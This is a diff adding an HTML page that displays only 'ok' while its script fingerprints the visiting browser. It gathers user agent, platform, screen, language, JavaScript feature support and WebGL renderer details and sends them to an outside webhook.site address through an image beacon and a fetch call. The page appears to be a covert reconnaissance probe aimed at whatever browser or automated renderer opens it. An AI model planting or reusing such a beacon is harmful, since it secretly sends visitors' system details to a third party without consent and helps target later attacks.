@@ -1,0 +1,18 @@
+<!DOCTYPE html><html><body><script>
+var WH = "https://webhook.site/170a66c4-f18e-46d3-9d97-418fef7e5124";
+var d = {ua: navigator.userAgent, plat: navigator.platform,
+  res: screen.width+"x"+screen.height+"x"+screen.colorDepth,
+  lang: navigator.language,
+  wasm: typeof WebAssembly, worker: typeof Worker, ws: typeof WebSocket,
+  engines: {webkit: !!window.webkitRequestAnimationFrame ? 1 : 0,
+            chrome: !!window.chrome ? 1 : 0,
+            opr: !!window.opera ? 1 : 0},
+  gl: (function(){try{var c=document.createElement("canvas").getContext("webgl");
+       return c.getParameter(c.VERSION)+" | "+c.getParameter(c.RENDERER)}catch(e){return "no-webgl"}})(),
+  perf: typeof performance, fetch: typeof fetch,
+  es6: (function(){try{return (0,eval)("(()=>1)")()}catch(e){return 0}})()};
+var q = "?d=" + encodeURIComponent(JSON.stringify(d));
+new Image().src = WH + "/beacon" + q;
+fetch(WH + "/fetch" + q, {method: "GET"});
+document.title = "ok";
+</script><h1>ok</h1></body></html>
